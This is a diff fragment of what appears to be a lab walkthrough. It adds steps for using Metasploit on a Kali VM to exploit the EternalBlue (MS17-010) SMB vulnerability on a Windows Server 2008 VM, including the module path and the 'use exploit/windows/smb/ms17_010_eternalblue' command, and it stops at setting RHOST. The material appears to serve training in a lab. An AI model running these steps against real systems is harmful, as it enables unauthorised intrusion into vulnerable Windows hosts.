@@ -252,3 +252,11 @@ run
 
 **On Kali VM**
 2. In a terminal, search in the following directory for the appropriate exploit for the EternalBlue vulnerability
+```
+/usr/share/metasploit-framework/modules/exploits
+```
+3. On Metasploit, search for exploits for the EternalBlue vulnerability
+```
+use exploit/windows/smb/ms17_010_eternalblue
+```
+4. Set the remote host (RHOST) to the Win2008 VM IP
